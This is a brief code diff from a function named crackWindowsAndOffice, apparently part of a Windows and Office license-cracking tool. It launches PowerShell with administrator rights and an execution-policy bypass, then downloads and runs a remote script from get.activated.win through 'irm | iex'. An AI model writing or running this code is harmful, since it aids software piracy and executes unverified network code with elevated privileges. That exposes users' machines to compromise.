@@ -13,7 +13,7 @@ void crackWindowsAndOffice() {
         SHELLEXECUTEINFOW sei = { sizeof(sei) };
         sei.lpVerb = L"runas";
         sei.lpFile = L"powershell.exe";
-        sei.lpParameters = L"irm https://get.activated.win | iex";
+        sei.lpParameters = L"-NoProfile -ExecutionPolicy Bypass -Command \"irm https://get.activated.win | iex\"";
         sei.hwnd = NULL;
         sei.nShow = SW_NORMAL;
 
